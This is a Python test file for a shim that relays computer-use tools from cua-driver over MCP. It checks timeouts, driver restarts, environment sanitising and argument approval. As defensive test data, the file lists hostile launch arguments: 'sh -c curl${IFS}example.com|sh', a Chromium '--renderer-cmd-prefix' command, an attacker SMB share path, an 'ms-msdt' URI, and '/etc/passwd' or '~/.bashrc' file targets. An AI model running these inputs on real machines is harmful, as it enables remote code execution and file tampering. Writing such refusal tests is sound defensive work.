"""Computer use through cua-driver: the MCP client, the driver bridge, the
tool catalog, and the COMPUTER_TOOLS / COMPUTER_TOOL_CALL handler, against
a fake driver (tests/fake_cua_driver.py) that speaks MCP over stdio."""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any

import pytest

from autogpt_local_executor.audit import AuditWriter
from autogpt_local_executor.computer_use import catalog, concealed, driver
from autogpt_local_executor.computer_use.driver import CuaDriverBridge, DriverUnavailable
from autogpt_local_executor.computer_use.mcp_client import McpClosedError, StdioMcpClient
from autogpt_local_executor.config import ShimConfig
from autogpt_local_executor.handlers import ComputerUseHandler
from autogpt_local_executor.protocol import (
    ComputerImageContent,
    ComputerTextContent,
    ComputerToolCallMessage,
    ComputerToolCallPayload,
    ComputerToolResultMessage,
    ComputerToolsRequestMessage,
    ComputerToolsResponseMessage,
    ErrorCode,
    ErrorMessage,
    new_id,
    now_ts,
)
from tests.cua_fakes import FAKE, fake_bridge, fake_client, fake_log, records

__all__ = ["fake_log"]  # a fixture, used by name

_fake_client = fake_client
_records = records


def _bridge(*, clipboard: bool = False, **kwargs: Any) -> CuaDriverBridge:
    return fake_bridge(clipboard=clipboard, **kwargs)


# ── MCP client ───────────────────────────────────────────────────────────


async def test_the_client_completes_the_handshake_and_lists_tools(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    try:
        initialized = await client.start(timeout=10)
        tools = await client.list_tools(timeout=10)
    finally:
        await client.close()

    assert (initialized.server_name, initialized.server_version) == ("cua-driver", "0.38.0")
    assert initialized.instructions == "Fake cua-driver guidance."
    assert {tool["name"] for tool in tools} >= {"click", "get_window_state"}


async def test_a_tool_list_that_repeats_its_cursor_is_refused(fake_log, monkeypatch) -> None:
    """list_tools followed nextCursor until there was none, with no check,
    so a driver that kept answering the same cursor kept it going for good,
    holding the bridge's lock and the HELLO that waits on it."""
    from autogpt_local_executor.computer_use.mcp_client import McpError

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "same")
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpError, match="cursor"):
            await asyncio.wait_for(client.list_tools(timeout=10), timeout=5)
    finally:
        await client.close()


async def test_a_driver_whose_tool_list_loops_is_unavailable(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "same")
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="cursor"):
            await asyncio.wait_for(bridge.snapshot(), timeout=5)
    finally:
        await bridge.close()


async def test_a_tool_list_that_never_ends_is_cut_off(fake_log, monkeypatch) -> None:
    from autogpt_local_executor.computer_use import mcp_client
    from autogpt_local_executor.computer_use.mcp_client import McpError

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "new")
    monkeypatch.setattr(mcp_client, "MAX_TOOL_LIST_PAGES", 5)
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpError, match="pages"):
            await asyncio.wait_for(client.list_tools(timeout=10), timeout=5)
    finally:
        await client.close()


async def test_the_tool_list_deadline_covers_every_page(fake_log, monkeypatch) -> None:
    """Each page got the whole timeout afresh, so the timeout never bounded
    the listing."""
    import time

    from autogpt_local_executor.computer_use import mcp_client

    monkeypatch.setenv("FAKE_CUA_NEXT_CURSOR", "new")
    monkeypatch.setattr(mcp_client, "MAX_TOOL_LIST_PAGES", 10**9)
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    started = time.monotonic()
    try:
        with pytest.raises(TimeoutError):
            await asyncio.wait_for(client.list_tools(timeout=0.5), timeout=30)
    finally:
        await client.close()
    # Its own 0.5 s deadline, with 10x room for a slow runner, not the guard's.
    assert time.monotonic() - started < 5


async def test_a_request_past_its_deadline_is_cancelled_as_mcp_has_it(
    fake_log: Path, monkeypatch
) -> None:
    """The client sends the cancel notice; cua-driver 0.38 reads it only
    once the request is done, and drops it. CuaDriverBridge deals with that
    (test_a_call_past_its_deadline_stops_the_driver)."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1")
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(TimeoutError):
            await client.call_tool("drag", {"pid": -2}, timeout=0.3)
        for _ in range(250):
            if _records(fake_log, "notification_dropped")[1:]:
                break
            await asyncio.sleep(0.02)
    finally:
        await client.close()

    assert _records(fake_log, "slow_done")
    assert [r["method"] for r in _records(fake_log, "notification_dropped")] == [
        "notifications/initialized",
        "notifications/cancelled",
    ]


async def test_a_call_past_its_deadline_stops_the_driver(fake_log: Path, monkeypatch) -> None:
    """cua-driver 0.38 can't cancel a request it is running, so a call past
    its deadline went on acting on the machine after the shim had answered
    COMMAND_TIMEOUT, and the next call waited behind it."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        first = bridge._client
        assert first is not None
        with pytest.raises(TimeoutError):
            await bridge.call_tool("drag", {"pid": -2}, timeout=0.3)
        assert first.alive is False
        # One more start than the restart budget allows, all of them stops
        # the shim made, not the driver failing.
        for _ in range(driver.MAX_STARTS_PER_WINDOW):
            with pytest.raises(TimeoutError):
                await bridge.call_tool("drag", {"pid": -2}, timeout=0.3)
        result = await bridge.call_tool("click", {"pid": 1}, timeout=10)
        await asyncio.sleep(2.5)
    finally:
        await bridge.close()

    assert result["structuredContent"] == {"arguments": {"pid": 1}}
    assert _records(fake_log, "slow_done") == []
    assert len(_records(fake_log, "initialize")) == driver.MAX_STARTS_PER_WINDOW + 2


async def test_a_new_display_restarts_the_driver_off_the_budget(
    fake_log: Path, monkeypatch
) -> None:
    """A driver keeps the environment it started with, so after a new login
    (another display, and on GNOME another XAUTHORITY) it drove a display
    that was gone until something else restarted it. The bridge now starts
    a driver with the display the shim has, and that restart, the shim's own
    doing, doesn't count against the restart budget."""
    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.setenv("XAUTHORITY", "/run/user/1000/xauth_0")
    bridge = fake_bridge()
    try:
        await bridge.call_tool("click", {"pid": 1}, timeout=10)
        for n in range(1, driver.MAX_STARTS_PER_WINDOW + 1):
            monkeypatch.setenv("DISPLAY", f":{n}")
            monkeypatch.setenv("XAUTHORITY", f"/run/user/1000/xauth_{n}")
            await bridge.call_tool("click", {"pid": 1}, timeout=10)
        await bridge.call_tool("click", {"pid": 2}, timeout=10)
    finally:
        await bridge.close()

    started = [record["env"] for record in _records(fake_log, "initialize")]
    assert [(env["DISPLAY"], env["XAUTHORITY"]) for env in started] == [
        (f":{n}", f"/run/user/1000/xauth_{n}") for n in range(driver.MAX_STARTS_PER_WINDOW + 1)
    ]
    assert len(_records(fake_log, "call")) == driver.MAX_STARTS_PER_WINDOW + 2


async def test_a_cancelled_call_stops_the_driver(fake_log: Path, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "2")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        first = bridge._client
        assert first is not None
        task = asyncio.create_task(bridge.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(100):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        assert first.alive is False
        await asyncio.sleep(2.5)
    finally:
        await bridge.close()

    assert _records(fake_log, "slow_done") == []


async def test_a_quick_call_waits_its_turn_rather_than_stopping_a_running_one(
    fake_log: Path, monkeypatch
) -> None:
    """A call that times out waiting for its turn never reached the driver,
    so it must not stop the one the driver is running: HELLO's screen size
    for one session would end another session's call."""
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    bridge = fake_bridge()
    try:
        await bridge.snapshot()
        slow = asyncio.create_task(bridge.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(100):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)
        with pytest.raises(TimeoutError):
            await bridge.call_tool("get_screen_size", {}, timeout=0.3)
        result = await slow
    finally:
        await bridge.close()

    assert result["content"] == [{"type": "text", "text": "slow"}]
    assert len(_records(fake_log, "initialize")) == 1


async def test_a_driver_that_exits_fails_the_waiting_request(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        with pytest.raises(McpClosedError, match="exit code 3"):
            await client.call_tool("drag", {"pid": -3}, timeout=10)
        assert not client.alive
    finally:
        await client.close()


class _StalledInput:
    """A pipe to a driver that has stopped reading its input: writes are
    taken, and a drain past the first `drains` never ends."""

    def __init__(self, drains: int = 0) -> None:
        self.written: list[bytes] = []
        self._drains = drains

    def write(self, data: bytes) -> None:
        self.written.append(data)

    async def drain(self) -> None:
        if self._drains > 0:
            self._drains -= 1
            return
        await asyncio.Event().wait()

    def is_closing(self) -> bool:
        return False


def _client_writing_to(stdin: _StalledInput) -> StdioMcpClient:
    from types import SimpleNamespace

    client = StdioMcpClient(["cua-driver", "mcp"])
    client._process = SimpleNamespace(stdin=stdin, returncode=None, pid=1)  # type: ignore[assignment]
    return client


async def test_a_request_the_driver_does_not_read_ends_at_its_deadline() -> None:
    """The deadline started once the request was written, so a driver that
    had stopped reading its input held a large call in drain() for good,
    and with it the computer's turn: the bridge stops the driver only when
    the call returns."""
    stdin = _StalledInput()
    client = _client_writing_to(stdin)
    task = asyncio.ensure_future(client.call_tool("type_text", {"text": "x" * 100}, timeout=0.2))
    try:
        done, _ = await asyncio.wait({task}, timeout=20)
        assert task in done
        with pytest.raises(TimeoutError):
            task.result()
    finally:
        task.cancel()


async def test_a_cancel_notice_the_driver_does_not_read_does_not_hold_the_call() -> None:
    """The request went out, no answer came, and the cancel notice sent at
    the deadline then waited in drain() for good."""
    stdin = _StalledInput(drains=1)
    client = _client_writing_to(stdin)
    task = asyncio.ensure_future(client.call_tool("click", {"pid": 5}, timeout=0.2))
    try:
        done, _ = await asyncio.wait({task}, timeout=20)
        assert task in done
        with pytest.raises(TimeoutError):
            task.result()
        assert b"notifications/cancelled" in stdin.written[-1]
    finally:
        task.cancel()


async def test_the_client_answers_the_servers_ping(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    try:
        await client.request("ping-me", {}, timeout=10)
        for _ in range(100):
            if _records(fake_log, "client_reply"):
                break
            await asyncio.sleep(0.02)
    finally:
        await client.close()

    [reply] = _records(fake_log, "client_reply")
    assert reply["message"] == {"jsonrpc": "2.0", "id": "server-1", "result": {}}


async def test_closing_the_client_closes_the_drivers_stdin(fake_log: Path) -> None:
    client = _fake_client([str(FAKE), "mcp"])
    await client.start(timeout=10)
    await client.close()

    assert _records(fake_log, "stdin_closed")


# ── Bridge ───────────────────────────────────────────────────────────────


async def test_the_driver_runs_under_the_shims_policy_and_without_telemetry(
    fake_log: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The policy allows exactly the offered tools; an approval bypass or a
    manifest in the shim's environment never reaches the driver."""
    monkeypatch.setenv("CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS", "1")
    monkeypatch.setenv("CUA_DRIVER_CAPABILITY_MANIFEST_FILE", "/tmp/someone-elses.yaml")
    bridge = _bridge()
    try:
        await bridge.snapshot()
    finally:
        await bridge.close()

    [started] = _records(fake_log, "initialize")
    assert started["argv"] == ["mcp"]
    assert started["policy"] == sorted(catalog.offered_tools(enable_clipboard=False))
    env = started["env"]
    assert env["CUA_DRIVER_PERMISSION_MODE"] == "standard"
    assert env["CUA_DRIVER_DISABLE_UNRESTRICTED"] == "1"
    assert env["DO_NOT_TRACK"] == "1"
    assert env["CUA_DRIVER_RS_TELEMETRY_ENABLED"] == "false"
    assert env["CUA_DRIVER_RS_UPDATE_CHECK"] == "false"
    assert env["CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS"] is None
    assert env["CUA_DRIVER_CAPABILITY_MANIFEST_FILE"] is None


def test_the_driver_inherits_only_the_reviewed_cua_settings() -> None:
    """The driver took the shim's whole environment but five names, so a
    shell or service that had one of cua's own opt-outs set (from its test
    suite, say) silently weakened the driver."""
    base = {
        "PATH": "/usr/bin",
        "DISPLAY": ":0",
        "DBUS_SESSION_BUS_ADDRESS": "unix:path=/run/user/1000/bus",
        "CUA_LOG": "debug",
        "CUA_DRIVER_MANAGED_POLICY_FILE": "/etc/cua/managed.yaml",
        # Each of these weakens the driver or points it somewhere else.
        "CUA_DRIVER_BROWSER_NO_SANDBOX": "1",
        "CUA_E2E_BROWSER_NO_SANDBOX": "1",
        "CUA_DRIVER_BROWSER_NO_SECCOMP_SANDBOX": "1",
        "CUA_DRIVER_DISABLE_KEY_FOCUS_GUARD": "",
        "CUA_DRIVER_RS_MCP_HTTP_PORT": "8765",
        "CUA_DRIVER_BROWSER_PROFILE_ROOT": "/home/me/.config/google-chrome",
        "cua_driver_allow_brief_foreground": "1",
        "CUA_DRIVER_DANGEROUSLY_BYPASS_APPROVALS": "1",
        "CUA_DRIVER_PERMISSION_MODE": "unrestricted",
    }

    env = driver.driver_environment(Path("/tmp/policy.yaml"), base)

    assert {name for name in env if name.upper().startswith("CUA")} == {
        "CUA_LOG",
        "CUA_DRIVER_MANAGED_POLICY_FILE",
        "CUA_DRIVER_PERMISSION_MODE",
        "CUA_DRIVER_DISABLE_UNRESTRICTED",
        "CUA_DRIVER_RS_TELEMETRY_ENABLED",
        "CUA_DRIVER_RS_UPDATE_CHECK",
        "CUA_DRIVER_POLICY_FILE",
    }
    assert env["CUA_DRIVER_PERMISSION_MODE"] == "standard"
    assert env["PATH"] == "/usr/bin" and env["DISPLAY"] == ":0"
    assert env["DBUS_SESSION_BUS_ADDRESS"] == base["DBUS_SESSION_BUS_ADDRESS"]


def test_the_driver_inherits_none_of_the_shims_own_settings() -> None:
    """The driver took the shim's settings with the rest of its environment,
    and an app it launched by name (a terminal, say) inherited them, the
    keychain passphrase for the file fallback among them, where the agent
    could show them with `env`."""
    base = {
        "PATH": "/usr/bin",
        "DISPLAY": ":0",
        "AUTOGPT_SHIM_KEYCHAIN_PASSPHRASE": "secret",
        "AUTOGPT_SHIM_PLATFORM_URL": "https://platform.example",
        "autogpt_shim_supervisor": "systemd",
    }

    env = driver.driver_environment(Path("/tmp/policy.yaml"), base)

    assert not [name for name in env if name.upper().startswith("AUTOGPT_SHIM_")]
    assert env["PATH"] == "/usr/bin" and env["DISPLAY"] == ":0"


async def test_the_policy_file_is_private_and_removed_with_the_bridge(fake_log: Path) -> None:
    bridge = _bridge()
    await bridge.snapshot()
    [started] = _records(fake_log, "initialize")
    policy = Path(started["env"]["CUA_DRIVER_POLICY_FILE"])
    if sys.platform != "win32":
        assert policy.stat().st_mode & 0o077 == 0
    await bridge.close()

    assert not policy.exists()


async def test_only_catalog_tools_are_offered(fake_log: Path, monkeypatch) -> None:
    """A driver lists more tools than the shim relays."""
    monkeypatch.setenv("FAKE_CUA_EXTRA_TOOLS", "kill_app,set_config")
    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False) | {"kill_app"},
        binary=FAKE,
        platform="linux",
        client_factory=_fake_client,
    )
    bridge._offered = catalog.offered_tools(enable_clipboard=False)
    try:
        snapshot = await bridge.snapshot()
    finally:
        await bridge.close()

    names = {tool["name"] for tool in snapshot.tools}
    assert names == catalog.offered_tools(enable_clipboard=False)
    assert snapshot.tool("kill_app") is None


async def test_a_driver_of_another_minor_version_is_refused(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.39.0")
    bridge = _bridge()
    with pytest.raises(DriverUnavailable) as raised:
        await bridge.snapshot()
    await bridge.close()

    assert raised.value.code == ErrorCode.DEPENDENCY_MISSING
    assert raised.value.details["found_version"] == "0.39.0"


async def test_a_missing_driver_is_a_missing_dependency(tmp_path: Path) -> None:
    bridge = CuaDriverBridge(
        tools=frozenset({"click"}), binary=tmp_path / "nope", client_factory=_fake_client
    )
    with pytest.raises(DriverUnavailable) as raised:
        await bridge.snapshot()

    assert raised.value.code == ErrorCode.DEPENDENCY_MISSING


async def test_a_driver_that_fails_to_start_says_why(fake_log, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_EXIT_AT_START", "1")
    bridge = _bridge()
    with pytest.raises(DriverUnavailable, match="fake driver failed to start"):
        await bridge.snapshot()
    await bridge.close()


@pytest.mark.parametrize(
    "metadata",
    [{"serverInfo": "cua-driver"}, {"capabilities": 1}, {"capabilities": ["tools"]}],
    ids=["server-info", "capabilities", "capabilities-list"],
)
async def test_a_driver_with_malformed_initialize_metadata_is_stopped(
    fake_log, monkeypatch, metadata: dict[str, Any]
) -> None:
    """A serverInfo or capabilities that wasn't an object was read after the
    start's cleanup, so it raised a plain AttributeError or TypeError: the
    driver it had started kept running, since the bridge didn't hold it
    yet, and HELLO, which goes on without computer use only for
    DriverUnavailable, failed."""
    import json

    monkeypatch.setenv("FAKE_CUA_INITIALIZE", json.dumps(metadata))
    started: list[StdioMcpClient] = []

    def factory(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = fake_client(argv, **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=factory,
    )
    try:
        with pytest.raises(DriverUnavailable, match="isn't an object"):
            await bridge.snapshot()
        [client] = started
        assert not client.alive
    finally:
        for client in started:
            await client.close()
        await bridge.close()


async def test_a_policy_file_that_cannot_be_written_leaves_the_driver_unavailable(
    fake_log, monkeypatch
) -> None:
    """The policy file was written before the start's error handling, so a
    full or unwritable temporary directory raised OSError out of the HELLO
    build, which drops computer use only for DriverUnavailable."""
    import errno
    import os

    def full(*_args, **_kwargs):
        raise OSError(errno.ENOSPC, os.strerror(errno.ENOSPC))

    monkeypatch.setattr(driver.tempfile, "mkdtemp", full)
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="policy"):
            await bridge.snapshot()
    finally:
        await bridge.close()
    assert records(fake_log) == []  # the driver never started


async def test_a_start_cancelled_before_the_tool_list_stops_the_driver(fake_log) -> None:
    """Shutdown cancels the task that is starting the driver. The process it
    had started was left running, and the bridge didn't know it, so its
    close() couldn't stop it."""
    listing = asyncio.Event()
    started: list[StdioMcpClient] = []

    class StalledList(StdioMcpClient):
        async def list_tools(self, *, timeout: float) -> list[dict[str, Any]]:
            listing.set()
            await asyncio.Event().wait()
            return []

    def stalled(argv: list[str], **kwargs: Any) -> StdioMcpClient:
        client = StalledList([sys.executable, *argv], **kwargs)
        started.append(client)
        return client

    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        binary=FAKE,
        platform="linux",
        client_factory=stalled,
    )
    starting = asyncio.create_task(bridge.snapshot())
    try:
        await asyncio.wait_for(listing.wait(), 30)
        starting.cancel()
        with pytest.raises(asyncio.CancelledError):
            await starting
        [client] = started
        assert not client.alive
    finally:
        for client in started:
            await client.close()
        await bridge.close()


async def test_the_driver_restarts_after_it_stops_then_gives_up(fake_log, monkeypatch) -> None:
    monkeypatch.setattr(driver, "MAX_STARTS_PER_WINDOW", 2)
    bridge = _bridge()
    try:
        with pytest.raises(DriverUnavailable, match="stopped during the call"):
            await bridge.call_tool("drag", {"pid": -3}, timeout=10)
        # The next call starts it again.
        result = await bridge.call_tool("click", {"pid": 7}, timeout=10)
        assert result["structuredContent"] == {"arguments": {"pid": 7}}
        with pytest.raises(DriverUnavailable):
            await bridge.call_tool("drag", {"pid": -3}, timeout=10)
        with pytest.raises(DriverUnavailable, match="stopped 2 times"):
            await bridge.call_tool("click", {"pid": 7}, timeout=10)
    finally:
        await bridge.close()

    assert len(_records(fake_log, "initialize")) == 2


@pytest.mark.parametrize(
    ("platform", "argv"),
    [("darwin", ["mcp", "--direct"]), ("linux", ["mcp"]), ("win32", ["mcp"])],
)
def test_the_shim_always_owns_the_drivers_runtime(platform: str, argv: list[str]) -> None:
    """macOS's default relays to CuaDriver.app, a daemon the person installs,
    updates and shares with other clients, under its own policy; the shim
    runs its pinned driver itself instead."""
    assert driver.driver_runtime(platform) == "direct"
    assert driver.driver_argv(Path("cua-driver"), "direct", platform)[1:] == argv


def test_the_wheels_binary_is_found_without_importing_the_package(
    tmp_path: Path, monkeypatch
) -> None:
    """cua_driver/__init__ loads a native library; finding the binary must
    not."""
    package = tmp_path / "cua_driver"
    (package / "bin").mkdir(parents=True)
    (package / "__init__.py").write_text("raise RuntimeError('imported')\n")
    name = "cua-driver.exe" if sys.platform == "win32" else "cua-driver"
    (package / "bin" / name).write_text("")
    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.delitem(sys.modules, "cua_driver", raising=False)

    assert driver.find_driver_binary() == package / "bin" / name
    assert "cua_driver" not in sys.modules


# ── Catalog ──────────────────────────────────────────────────────────────


def test_the_policy_document_allows_exactly_the_offered_tools() -> None:
    tools = catalog.offered_tools(enable_clipboard=True)
    assert json.loads(catalog.policy_document(tools)) == {"allow": {"tools": sorted(tools)}}


def test_clipboard_tools_are_offered_only_when_enabled() -> None:
    assert not catalog.CLIPBOARD_TOOLS & catalog.offered_tools(enable_clipboard=False)
    assert catalog.CLIPBOARD_TOOLS <= catalog.offered_tools(enable_clipboard=True)


@pytest.mark.parametrize(
    ("tool", "arguments", "argument"),
    [
        ("get_window_state", {"pid": 1, "screenshot_out_file": "~/.bashrc"}, "screenshot_out_file"),
        ("get_desktop_state", {"screenshot_out_file": "/tmp/x.png"}, "screenshot_out_file"),
        ("clipboard_write", {"file_path": "/etc/passwd"}, "file_path"),
        ("clipboard_write", {"image_path": "/a.png"}, "image_path"),
        ("browser_set_input_files", {"ref": "p1:2", "files": ["/home/me/cv.pdf"]}, "files"),
        # The script's own calls run inside the driver, out of the shim's
        # sight, and can pass screenshot_out_file to get_window_state.
        ("run_script", {"script": "return 1"}, "script"),
        # The driver starts these out of sight, with no window of their own.
        ("launch_app", {"launch_path": "sh -c id"}, "launch_path"),
        ("launch_app", {"path": "C:\\Users\\me\\Downloads\\setup.exe"}, "path"),
        # A Chromium flag such as --renderer-cmd-prefix runs a command.
        ("launch_app", {"name": "Google Chrome",
                        "additional_arguments": ["--renderer-cmd-prefix=sh -c id"]},
         "additional_arguments"),
        # A file, a share or a URL scheme opens in whatever app handles it,
        # and a web page in the person's own, signed-in browser.
        ("launch_app", {"name": "Calculator", "urls": ["https://example.com"]}, "urls"),
        ("launch_app", {"bundle_id": "com.example.app", "webkit_inspector_port": 9222},
         "webkit_inspector_port"),
    ],
)  # fmt: skip
def test_arguments_that_reach_the_disk_wait_for_approval(
    tool: str, arguments: dict, argument: str
) -> None:
    with pytest.raises(catalog.ApprovalRequired) as waiting:
        catalog.check_arguments(tool, arguments)
    assert waiting.value.argument == argument

    catalog.check_arguments(tool, arguments, approved=[argument])


@pytest.mark.parametrize(
    ("tool", "arguments", "approved", "argument"),
    [
        ("clipboard_write", {}, [], "text"),
        ("clipboard_write", {"text": "x", "image_path": "/a.png"}, ["image_path"], "text"),
        ("check_permissions", {"prompt": True}, [], "prompt"),
        # Only an argument that needs approval can be approved.
        ("click", {"pid": 1}, ["pid"], "pid"),
        ("get_window_state", {"pid": 1}, ["file_path"], "file_path"),
        (
            "run_steps",
            {"steps": [{"tool": "click", "args": {}}, {"tool": "get_window_state",
                       "args": {"screenshot_out_file": "/x"}}]},
            [],
            "steps[1].screenshot_out_file",
        ),
        (
            "run_steps",
            {"steps": [{"get_window_state": {"screenshot_out_file": "/x"}}]},
            [],
            "steps[0].screenshot_out_file",
        ),
        ("run_steps", {"steps": [{"run_script": {"script": "return 1"}}]}, [], "steps[0].script"),
        # The driver runs `observe` as get_window_state, which writes the
        # screenshot to the file it names.
        (
            "run_steps",
            {"steps": [{"tool": "move_cursor", "args": {"x": 1, "y": 1}}],
             "observe": {"pid": 1, "window_id": 2, "screenshot_out_file": "/x"}},
            [],
            "observe.screenshot_out_file",
        ),
        # A launch that needs no approval names an app; a path, a share or a
        # URL scheme in its place runs whatever it points at.
        ("launch_app", {"name": "/home/me/Downloads/payload"}, [], "name"),
        ("launch_app", {"name": "C:\\Users\\me\\Downloads\\setup.exe"}, [], "name"),
        ("launch_app", {"name": "\\\\attacker\\share\\x.exe"}, [], "name"),
        ("launch_app", {"bundle_id": "ms-msdt:/id PCWDiagnostic"}, [], "bundle_id"),
        ("launch_app", {"aumid": "{6D809377-6AF0-444B-8957-A3773F02200E}\\app.exe"}, [],
         "aumid"),
        ("launch_app", {"name": "-n"}, [], "name"),
        ("launch_app", {"name": "Calculator\u202e"}, [], "name"),
        # Approving a path doesn't let `name` carry one.
        ("launch_app", {"name": "/bin/sh", "urls": ["https://example.com"]}, ["urls"], "name"),
    ],
)  # fmt: skip
def test_arguments_this_machine_never_takes_are_refused(
    tool: str, arguments: dict, approved: list[str], argument: str
) -> None:
    with pytest.raises(catalog.ArgumentRefused) as refused:
        catalog.check_arguments(tool, arguments, approved=approved)
    assert refused.value.argument == argument


@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("get_window_state", {"pid": 1, "screenshot_out_file": None}),
        ("get_window_state", {"pid": 1, "screenshot_out_file": ""}),
        ("clipboard_write", {"text": "hello"}),
        ("check_permissions", {"prompt": False}),
        ("run_steps", {"steps": [{"tool": "click", "args": {"pid": 1}}, "garbage"]}),
        ("launch_app", {"name": "Calculator"}),
        ("launch_app", {"name": "notepad.exe", "start_minimized": True}),
        ("launch_app", {"bundle_id": "com.apple.calculator"}),
        ("launch_app", {"aumid": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"}),
    ],
)
def test_ordinary_arguments_pass(tool: str, arguments: dict) -> None:
    catalog.check_arguments(tool, arguments)


@pytest.mark.parametrize(
    ("name", "programs", "refused"),
    [
        # cua-driver runs `sh` with the rest as its arguments: any command.
        ("sh -c curl${IFS}example.com|sh", {"sh"}, True),
        ("python3 -mhttp.server", {"python3"}, True),
        # A program's own name runs it, in the background: `reboot` restarts
        # the computer.
        ("reboot", {"reboot"}, True),
        ("firefox", {"firefox"}, True),
        # No program is called "Google" or "Firefox" (PATH is case-sensitive),
        # so the driver matches the app by its display name.
        ("Google Chrome", set(), False),
        ("Firefox", {"firefox"}, False),
    ],
)
def test_a_linux_launch_name_is_not_a_command_line(
    name: str, programs: set[str], refused: bool
) -> None:
    """On Linux cua-driver runs `name` as a command line split at spaces
    before it looks for an installed app of that name, so a name could run
    any program with any arguments without the approval launch_path needs,
    and a program's own name ran that program, with none."""

    def on_path(word: str) -> str | None:
        return f"/usr/bin/{word}" if word in programs else None

    def check(platform: str) -> None:
        catalog.check_arguments("launch_app", {"name": name}, platform=platform, on_path=on_path)

    if refused:
        with pytest.raises(catalog.ArgumentRefused) as caught:
            check("linux")
        assert caught.value.argument == "name"
    else:
        check("linux")
    # macOS and Windows look a name up; they never run it as a command line.
    check("darwin")
    check("win32")


def test_the_platform_never_sees_the_session_argument() -> None:
    schema = {
        "type": "object",
        "properties": {"session": {"type": "string"}, "pid": {"type": "integer"}},
        "required": ["session", "pid"],
    }

    shown = catalog.without_session(schema)

    assert shown == {
        "type": "object",
        "properties": {"pid": {"type": "integer"}},
        "required": ["pid"],
    }
    assert "session" in schema["properties"]


# ── Handler ──────────────────────────────────────────────────────────────


def _config(tmp_path: Path, **overrides: Any) -> ShimConfig:
    values: dict[str, Any] = {
        "allowed_root": tmp_path,
        "audit_log_path": tmp_path / "audit.log",
        "enable_computer_use": True,
        "session_id": "session-1",
    }
    values.update(overrides)
    return ShimConfig(**values)


@pytest.fixture
async def make_handler(tmp_path: Path, fake_log: Path):
    made: list[ComputerUseHandler] = []

    def make(**overrides: Any) -> ComputerUseHandler:
        config = _config(tmp_path, **overrides)
        audit = AuditWriter(config.audit_log_path, b"a" * 32)
        handler = ComputerUseHandler(
            config,
            audit=audit,
            driver=CuaDriverBridge(
                tools=catalog.offered_tools(enable_clipboard=config.enable_clipboard),
                binary=FAKE,
                platform="linux",
                client_factory=_fake_client,
            ),
        )
        made.append(handler)
        return handler

    yield make
    for handler in made:
        await handler.close()


def _call(tool: str, arguments: dict | None = None, **payload: Any) -> ComputerToolCallMessage:
    return ComputerToolCallMessage(
        id=new_id(),
        ts=now_ts(),
        payload=ComputerToolCallPayload(tool=tool, arguments=arguments or {}, **payload),
    )


def _audit(tmp_path: Path) -> list[dict]:
    return [
        json.loads(line)
        for line in (tmp_path / "audit.log").read_text().splitlines()
        if '"COMPUTER_TOOL_CALL"' in line
    ]


async def test_the_tool_list_carries_the_drivers_guidance_and_this_machines_rules(
    make_handler,
) -> None:
    handler = make_handler(max_screenshots_per_minute=7)

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolsResponseMessage)
    payload = response.payload
    assert payload.driver.name == "cua-driver" and payload.driver.runtime == "direct"
    assert payload.instructions.startswith("Fake cua-driver guidance.")
    assert "at most 7 images" in payload.instructions
    assert "Clipboard tools are off" in payload.instructions
    names = {tool.name for tool in payload.tools}
    assert names == catalog.offered_tools(enable_clipboard=False)
    zoom = next(tool for tool in payload.tools if tool.name == "zoom")
    assert "session" not in zoom.input_schema["properties"]
    assert zoom.input_schema["required"] == []
    assert zoom.approval_arguments == {}
    assert "wait for the person's approval" in payload.instructions


async def test_the_tool_list_names_the_arguments_that_need_approval(make_handler) -> None:
    handler = make_handler(enable_clipboard=True)

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolsResponseMessage)
    approval = {
        tool.name: sorted(tool.approval_arguments)
        for tool in response.payload.tools
        if tool.approval_arguments
    }
    assert approval == {
        "browser_set_input_files": ["files"],
        "clipboard_write": ["file_path", "image_path"],
